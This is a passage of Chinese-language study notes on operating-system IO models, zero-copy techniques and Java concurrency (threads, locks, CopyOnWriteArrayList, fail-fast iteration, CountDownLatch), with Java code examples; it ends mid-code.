<p>[<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848327.jpeg" alt="在这里插入图片描述"></p>
<p>（1）当用户线程调用了read系统调用，立刻就可以开始去做其它的事，用户线程不阻塞。</p>
<p>（2）内核（kernel）就开始了IO的第一个阶段：准备数据。当kernel一直等到数据准备好了，它就会将数据从kernel内核缓冲区，拷贝到用户缓冲区（用户内存）。</p>
<p>（3）kernel会给用户线程发送一个信号（signal），或者回调用户线程注册的回调接口，告诉用户线程read操作完成了。</p>
<p>（4）用户线程读取用户缓冲区的数据，完成后续的业务操作。</p>
<p>异步IO模型的特点：</p>
<p>在内核kernel的等待数据和复制数据的两个阶段，用户线程都不是block(阻塞)的。用户线程需要接受kernel的IO操作完成的事件，或者说注册IO操作完成的回调函数，到操作系统的内核。所以说，异步IO有的时候，也叫做信号驱动 IO 。</p>
<p>异步IO模型缺点：</p>
<p>需要完成事件的注册与传递，这里边需要底层操作系统提供大量的支持，去做大量的工作。</p>
<p>目前来说， Windows 系统下通过 IOCP 实现了真正的异步 I&#x2F;O。但是，就目前的业界形式来说，Windows 系统，很少作为百万级以上或者说高并发应用的服务器操作系统来使用。</p>
<p>而在 Linux 系统下，异步IO模型在2.6版本才引入，目前并不完善。所以，这也是在Linux下，实现高并发网络编程时都是以 IO 复用模型模式为主。</p>
<h3 id="小结一下："><a href="#小结一下：" class="headerlink" title="小结一下："></a>小结一下：</h3><p>四种IO模型，理论上越往后，阻塞越少，效率也是最优。在这四种 I&#x2F;O 模型中，前三种属于同步 I&#x2F;O，因为其中真正的 I&#x2F;O 操作将阻塞线程。只有最后一种，才是真正的异步 I&#x2F;O 模型，可惜目前Linux 操作系统尚欠完善。</p>
<h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><h4 id="1-传统-I-x2F-O"><a href="#1-传统-I-x2F-O" class="headerlink" title="1. 传统 I&#x2F;O"></a>1. 传统 I&#x2F;O</h4><p>先来看看传统方式，在进行一次读写时共涉及了4次上下文切换，2次 DMA 拷贝以及2次 CPU 拷贝。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848345.png" alt="screen-1535441"></p>
<h4 id="2-用户态直接IO"><a href="#2-用户态直接IO" class="headerlink" title="2. 用户态直接IO"></a>2. 用户态直接IO</h4><p>这是第一种思路，使应用进程或处于用户态下的库函数跨过内核直接访问硬件，内核在数据传输过程除了进行必要的虚拟存储配置工作外，不参与任何其他工作。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848347.png" alt="screen-1535947"></p>
<p>但只适用于不需要内核缓冲区处理的应用程序，这些应用程序通常在进程地址空间有自己的数据缓存机制，又称为自缓存应用程序，如数据库管理系统。其次，因 CPU 和磁盘 I&#x2F;O 之间的性能差距，就会造成资源的浪费，一般是会配合异步 I&#x2F;O 使用。</p>
<h4 id="3-mmap"><a href="#3-mmap" class="headerlink" title="3. mmap"></a>3. mmap</h4><p>这属于第二类优化，减少了 1 次 CPU 拷贝。MMAP 是数据不会到达用户空间内存，只会存在于系统空间的内存上，用户空间与系统空间共用同一个缓冲区，两者通过映射关联。<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848464.png" alt="screen-1773287"></p>
<p>整个 MMAP 过程，发生了 4 次上下文切换 + 1 次 CPU 拷贝 + 2 次 DMA 拷贝。</p>
<h4 id="4-sendfile"><a href="#4-sendfile" class="headerlink" title="4. sendfile"></a>4. sendfile</h4><p>这也是第二类优化。用户进程不需要单独调用 read&#x2F;write ，而是直接调用 sendfile() ，sendfile 再帮用户调用 read&#x2F;write 操作。数据可以直接在内核空间进行 I&#x2F;O 传输，省去了数据在用户空间和内核空间之间的拷贝。</p>
<p>与 mmap 内存映射方式不同的是， sendfile() 调用中数据对用户空间是完全不可见的。也就是说，这是一次完全意义上的数据传输过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848624.png" alt="image-20200610154454498"></p>
<p>整个过程发生 2 次上下文切换，1 次 CPU 拷贝和 2 次 DMA 拷贝。</p>
<h4 id="5-sendfile-DMA-gather-copy"><a href="#5-sendfile-DMA-gather-copy" class="headerlink" title="5. sendfile + DMA gather copy"></a>5. sendfile + DMA gather copy</h4><p>在前面的 sendfile() 方式中，CPU 仍需要一次拷贝，从 Linux 2.4 版本开始，DMA 自带了收集功能，可以将对应的数据描述信息（内存地址、地址偏移量）记录到相应的网络缓冲区（ socket buffer），由DMA 根据这些信息直接将内核缓冲区的数据拷贝到网卡设备中，省下了最后一次 CPU 拷贝。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848672.png" alt="image-20200610154613272"></p>
<p>这次只发生 2 次上下文切换 + 2 次 DMA 数据拷贝。</p>
<h4 id="6-splice"><a href="#6-splice" class="headerlink" title="6. splice"></a>6. splice</h4><p>sendfile 只适用于将数据从文件拷贝到网卡上，限定了使用范围。</p>
<p>splice 系统调用可以在内核空间的读缓冲区和网络缓冲区之间建立管道，支持任意两个文件之间互连，可以在操作系统地址空间中整块地移动数据。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848689.png" alt="image-20200610161033841"></p>
<p>同样发生 2 次上下文切换 + 2 次 DMA 数据拷贝。</p>
<h4 id="7-写时复制"><a href="#7-写时复制" class="headerlink" title="7. 写时复制"></a>7. 写时复制</h4><p>这个就是第三种思路了，COW 写时复制。</p>
<p>当用户进程有写操作时，就把这块共享的内存空间复制一份到其他区域，给写进程专用。这种方法在能够降低系统开销，如果某个进程永远不会对数据进行更改，那就永远不需要拷贝。</p>
<h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程: 进程是程序的一次执行过程，是系统运行程序的基本单位，因此进程是动态的。系统运行一个程序即是一个进程从创建，运行到消亡的过程。在 Java 中，当我们启动 main 函数时其实就是启动了一个 JVM 的进程，而 main 函数所在的线程就是这个进程中的一个线程，也称主线程; 启动两个main函数就是两个jvm进程;</p>
<p>线程: 线程与进程相似，但线程是一个比进程更小的执行单位。一个进程在其执行的过程中可以产生多个线程。与进程不同的是同类的多个线程共享进程的<strong>堆</strong>和<strong>方法区</strong>资源，但每个线程有自己的<strong>程序计数器</strong>、<strong>虚拟机栈</strong>和<strong>本地方法栈</strong>，所以系统在产生一个线程，或是在各个线程之间作切换工作时，负担要比进程小得多，也正因为如此，线程也被称为轻量级进程。</p>
<ul>
<li>计算机的核心是CPU，它承担了所有的计算任务。它就像一座工厂，时刻在运行。</li>
<li>假定工厂的电力有限，一次只能供给一个车间使用。也就是说，一个车间开工的时候，其他车间都必须停工。背后的含义就是，单个CPU一次只能运行一个任务。编者注: 多核的CPU就像有了多个发电厂，使多工厂(多进程)实现可能。</li>
<li>进程就好比工厂的车间，它代表CPU所能处理的单个任务。任一时刻，CPU总是运行一个进程，其他进程处于非运行状态。（子进程就是工厂的复制版， 各个工厂独立，一般互不影响）</li>
<li>一个车间里（可能只有一台机器），可以有很多工人。他们协同完成一个任务。（由于是流水线工作，一个线程挂了很可能会影响到整个进程，每个工人有自己的独有区域，不能给别人访问）</li>
<li>线程就好比车间里的工人。一个进程可以包括多个线程。</li>
<li>车间的空间是工人们共享的，比如许多房间是每个工人都可以进出的。这象征一个进程的内存空间是共享的，每个线程都可以使用这些共享内存。</li>
<li>可是，每间房间的大小不同，有些房间最多只能容纳一个人，比如厕所。里面有人的时候，其他人就不能进去了。这代表一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存。</li>
<li>一个防止他人进入的简单方法，就是门口加一把锁。先到的人锁上门，后到的人看到上锁，就在门口排队，等锁打开再进去。这就叫”互斥锁”（Mutual exclusion，缩写 Mutex），防止多个线程同时读写某一块内存区域。</li>
<li>还有些房间，可以同时容纳n个人，比如厨房。也就是说，如果人数大于n，多出来的人只能在外面等着。这好比某些内存区域，只能供给固定数目的线程使用。</li>
<li>这时的解决方法，就是在门口挂n把钥匙。进去的人就取一把钥匙，出来时再把钥匙挂回原处。后到的人发现钥匙架空了，就知道必须在门口排队等着了。这种做法叫做”信号量”（Semaphore），用来保证多个线程不会互相冲突。</li>
<li>不难看出，mutex是semaphore的一种特殊情况（n&#x3D;1时）。也就是说，完全可以用后者替代前者。但是，因为mutex较为简单，且效率高，所以在必须保证资源独占的情况下，还是采用这种设计。</li>
</ul>
<h3 id="多进程编程和多线程编程的优缺点"><a href="#多进程编程和多线程编程的优缺点" class="headerlink" title="多进程编程和多线程编程的优缺点"></a>多进程编程和多线程编程的优缺点</h3><p>多进程编程和多线程编程，都可以使用并行机制来提升系统的运行效率。二者的区别在于运行时所占的内存分布不同，多线程是共用一套内存的代码块区间；而多进程是各用一套独立的内存区间。</p>
<p>多进程的优点是稳定性好，一个子进程崩溃了，不会影响主进程以及其余进程。基于这个特性，常常会用多进程来实现守护服务器的功能。</p>
<p>多进程编程也有不足，即创建进程的代价非常大，因为操作系统要给每个进程分配固定的资源，并且操作系统对进程的总数会有一定的限制，若进程过多，操作系统调度都会存在问题，会造成假死状态。</p>
<p>多线程编程的优点是效率较高一些，适用于批处理任务等功能；不足之处在于，任何一个线程崩溃都可能造成整个进程的崩溃，因为它们共享了进程的内存资源池。</p>
<p>既然多线程编程和多进程编程各有优缺点，因此它们分别适用于不同的场景。比如说（python），对于计算密集型的任务，多进程效率会更高一下；而对于IO密集型的任务（比如文件操作，网络爬虫），采用多线程编程效率更高。为什么是这样呢？</p>
<p>其实也不难理解。对于 IO 密集型操作，大部分消耗时间其实是等待时间，在等待时间中，<a href="http://c.biancheng.net/python/">Python</a>会释放GIL供新的线程使用，实现了线程间的切换；相反对于 CPU 密集型代码，2 个 CPU 干活肯定比一个 CPU 快很多。</p>
<p>Python，特指CPython的实现，由于GIL的存在，CPython不能有效的利用多核处理器。表现为任意时间一个进程只有一个线程在跑，而IO密集型运算，多数是在IO读写将线程堵塞掉了，这个时候线程切换是很合理的，反正线程只是单纯地等待，在这个等待的时候去做其他的事情，资源利用率就上去了。</p>
<p>在大型的计算机集群系统中，通常都会将多进程程序分布运行在不同的计算机上协同工作。而每一台计算机上的进程内部，又会由多个线程来并行工作。</p>
<p>注意，对于任务数来说，无论是多进程编程或者多线程编程，其进程数或线程数都不能太多：</p>
<ul>
<li>对于多进程编程来说，操作系统在切换任务时，会有一系列的保护现场措施，这要花费相当多的系统资源，若任务过多，则大部分资源都被用做干这些了，结果就是所有任务都做不好；</li>
<li>多线程编程也不是线程个数越多效率越高，通过下面的公式可以计算出线程数量最优的一个参考值。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848694.gif" alt="img"></p>
<h3 id="线程的生命周期和状态"><a href="#线程的生命周期和状态" class="headerlink" title="线程的生命周期和状态?"></a>线程的生命周期和状态?</h3><p>new，runnable(就绪和运行)，blocked，waiting，time_waiting， terminated; </p>
<h3 id="线程死锁的四个必要条件"><a href="#线程死锁的四个必要条件" class="headerlink" title="线程死锁的四个必要条件?"></a>线程死锁的四个必要条件?</h3><p>互斥，请求和保持，不可剥夺，循环等待;</p>
<h3 id="死锁处理方案"><a href="#死锁处理方案" class="headerlink" title="死锁处理方案?"></a>死锁处理方案?</h3><p>破坏4个必要条件;银行家算法;死锁的检测与恢复;</p>
<h3 id="sleep-和wait"><a href="#sleep-和wait" class="headerlink" title="sleep()和wait()"></a>sleep()和wait()</h3><p>sleep()不释放锁，wait()释放锁;wait()用于线程间交互&#x2F;通信，sleep用于暂停执行;wait需要别的对象调用同一对象上的notify()和notifyAll()或者使用wait(long timeout)自动苏醒;</p>
<h3 id="Start-和Run"><a href="#Start-和Run" class="headerlink" title="Start()和Run()"></a>Start()和Run()</h3><p>new 一个 Thread，线程进入了新建状态。调用 start()方法，会启动一个线程并使线程进入了就绪状态，当分配到时间片后就可以开始运行了。 start() 会执行线程的相应准备工作，然后自动执行 run() 方法的内容，这是真正的多线程工作。 但是，直接执行 run() 方法，会把 run() 方法当成一个 main 线程下的普通方法去执行，并不会在某个线程中执行它，所以这并不是多线程工作。</p>
<h4 id="创建线程的3种方式"><a href="#创建线程的3种方式" class="headerlink" title="创建线程的3种方式"></a>创建线程的3种方式</h4><ul>
<li><p>继承thread类，重写run方法，调用start()开启线程，不建议使用，避免oop(object-oriented programming)单继承局限性; Thread类也实现了Runable接口，Thread类里面的start方法调用native的start方法，也就是有操作系统来创建线程。</p>
</li>
<li><p>实现runnable接口，重写run方法， new Thread(p).start() (推荐);避免单继承局限性，灵活方便，方便同一个对象被多个线程使用，（用到了代理模式），这里可以使用匿名内部类</p>
</li>
<li><p>实现Callable接口</p>
</li>
</ul>
<p>（1）创建Callable接口的实现类，并实现call()方法，该call()方法将作为线程执行体，并且有返回值。</p>
<p>（2）创建Callable实现类的实例，使用FutureTask(实现RunnableFutrue接口， 这个接口有继承Runnable接口)类来包装Callable对象，该FutureTask对象封装了该Callable对象的call()方法的返回值。</p>
<p>（3）使用FutureTask对象作为Thread对象的target创建并启动新线程。</p>
<p>（4）调用FutureTask对象的get()方法来获得子线程执行结束后的返回值</p>
<h3 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h3><p>不推荐使用jdk提供的stop()和destroy()方法; 推荐线程自己停下来， 使用一个标志位来终止; </p>
<p>Yield()礼让但不一定成功，让出cpu然后重新竞争; join (底层是wait方法， 每个线程退出的时候会调用notofyAll()(优先级高的优先被调度)方法，通知所有等待在该线程对象上的线程)会让自己停下来，等被自己插队的那个线程执行完才执行自己;</p>
<h3 id="CopyOnWriteArrayList（COW）"><a href="#CopyOnWriteArrayList（COW）" class="headerlink" title="CopyOnWriteArrayList（COW）"></a>CopyOnWriteArrayList（COW）</h3><p>concurrentModificationException 并发修改异常</p>
<p>vector是安全的； Collections.synchronizedList(); 使用JUC下的CopyOnWriteArrayList；</p>
<p>cow ： 在写入时候避免覆盖，造成数据问题；cow实现在jdk8之后的版本改成了synchronized，比lock更高效；</p>
<p>多线程同时写也不会出问题， 使用volatile修饰， 使用了reentrantlock</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// jdk 8</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] elements = getArray();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">            <span class="comment">// 复制一份</span></span><br><span class="line">            Object[] newElements = Arrays.copyOf(elements， len + <span class="number">1</span>);</span><br><span class="line">            newElements[len] = e;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Fail-fast-快速失败-和-fail-safe-安全失败"><a href="#Fail-fast-快速失败-和-fail-safe-安全失败" class="headerlink" title="Fail-fast(快速失败) 和 fail-safe(安全失败)"></a>Fail-fast(快速失败) 和 fail-safe(安全失败)</h3><p>fail-safe允许在遍历的过程中对容器中的数据进行修改，而fail-fast则不允许。</p>
<p> <strong>fail-fast ( 快速失败 )</strong></p>
<p>fail-fast:直接在容器上进行遍历，在遍历过程中，一旦发现容器中的数据被修改了，会立刻抛出ConcurrentModificationException异常导致遍历失败。java.util包下的集合类都是快速失败机制的， 常见的的使用fail-fast方式遍历的容器有HashMap和ArrayList等。</p>
<p>在使用迭代器遍历一个集合对象时，比如增强for，如果遍历过程中对集合对象的内容进行了修改(增删改)，会抛出ConcurrentModificationException 异常.</p>
<p>fail-fast的出现场景<br>在我们常见的java集合中就可能出现fail-fast机制，比如ArrayList，HashMap。在多线程和单线程环境下都有可能出现快速失败。</p>
<p>避免fail-fast的方法：</p>
<p>方法1</p>
<p>在单线程的遍历过程中，如果要进行remove操作，可以调用迭代器的remove方法而不是集合类的remove方法</p>
<p>方法2</p>
<p>使用fail-safe机制，使用java并发包(java.util.concurrent)中的CopyOnWriterArrayList类来代替ArrayList，使用 ConcurrentHashMap来代替hashMap。</p>
<p><strong>fail-safe ( 安全失败 )</strong><br>fail-safe:这种遍历基于容器的一个克隆。因此，对容器内容的修改不影响遍历。java.util.concurrent包下的容器都是安全失败的，可以在多线程下并发使用，并发修改。常见的的使用fail-safe方式遍历的容器有ConcerrentHashMap和CopyOnWriteArrayList等。</p>
<p>原理：</p>
<p>采用安全失败机制的集合容器，在遍历时不是直接在集合内容上访问的，而是先复制原有集合内容，在拷贝的集合上进行遍历。由于迭代时是对原集合的拷贝进行遍历，所以在遍历过程中对原集合所作的修改并不能被迭代器检测到，所以不会触发Concurrent Modification Exception。</p>
<p>缺点：基于拷贝内容的优点是避免了Concurrent Modification Exception，但同样地，迭代器并不能访问到修改后的内容，即：迭代器遍历的是开始遍历那一刻拿到的集合拷贝，在遍历期间原集合发生的修改迭代器是不知道的。</p>
<h3 id="concurrentModificationException-并发修改异常"><a href="#concurrentModificationException-并发修改异常" class="headerlink" title="concurrentModificationException 并发修改异常"></a>concurrentModificationException 并发修改异常</h3><p>在并发情况下，多个线程同时读写可能会报这个异常</p>
<p>vector是安全的； Collections.synchronizedList(); 使用JUC下的CopyOnWriteArrayList；</p>
<p>cow ： 在写入时候避免覆盖，造成数据问题；cow后面改成了synchronized，比lock更高效；</p>
<h3 id="ArrayIndexOutOfBoundsException"><a href="#ArrayIndexOutOfBoundsException" class="headerlink" title="ArrayIndexOutOfBoundsException"></a>ArrayIndexOutOfBoundsException</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-25 9:37 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestArrayList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        ArrayList&lt;String&gt; strings = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">101</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">0</span>; i1 &lt; <span class="number">20</span>; i1++) &#123;</span><br><span class="line">                    strings.add(UUID.randomUUID().toString().substring(<span class="number">0</span>，<span class="number">5</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(strings.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CopyOnWriteSet"><a href="#CopyOnWriteSet" class="headerlink" title="CopyOnWriteSet"></a>CopyOnWriteSet</h3><p>collections.synchronizedSet(); </p>
<h3 id="两个线程交替打印1-100"><a href="#两个线程交替打印1-100" class="headerlink" title="两个线程交替打印1-100"></a>两个线程交替打印1-100</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * synchronized实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doSynchronized1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number.odd();</span><br><span class="line">        &#125;， <span class="string">&quot;odd&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number.even();</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">TOTAL</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                <span class="built_in">this</span>.notify();</span><br><span class="line">                System.out.println(<span class="string">&quot;偶数打印完毕，释放锁&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;偶数锁等待&quot;</span>);</span><br><span class="line">                    <span class="built_in">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                <span class="built_in">this</span>.notify();</span><br><span class="line">                System.out.println(<span class="string">&quot;奇数打印完毕，释放锁&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;奇数锁等待&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * lock实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Number2</span> <span class="variable">number2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number2.odd();</span><br><span class="line">        &#125;， <span class="string">&quot;odd&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            number2.even();</span><br><span class="line">        &#125;， <span class="string">&quot;even&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number2</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">TOTAL</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                    condition.signal();</span><br><span class="line">                    System.out.println(<span class="string">&quot;偶数打印完毕，释放锁&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;偶数锁等待&quot;</span>);</span><br><span class="line">                        condition.await();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= TOTAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;i=&quot;</span> + i++);</span><br><span class="line">                    condition.signal();</span><br><span class="line">                    System.out.println(<span class="string">&quot;奇数打印完毕，释放锁&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;奇数锁等待&quot;</span>);</span><br><span class="line">                        condition.await();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h3><p>允许一个或多个线程等待直到在其他线程中执行的一组操作完成的同步辅助;CAS思想;减法计数器;可以一个线程里countdown很多次，不一定要在多个线程里；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">countDownLatch.countDown(); <span class="comment">// 数量-1</span></span><br><span class="line">        countDownLatch.await(); <span class="comment">// 等待计数器归零，然后向下执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h3><p>加法计数器，底层使用reentrantlock， 如果计数器到达了设置值，则会新建一个线程去执行;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> add;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BrokenBarrierException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CyclicBarrier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 4:10 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">success</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">8</span>， () -&gt; &#123;</span><br><span class="line">            System.out.println(<span 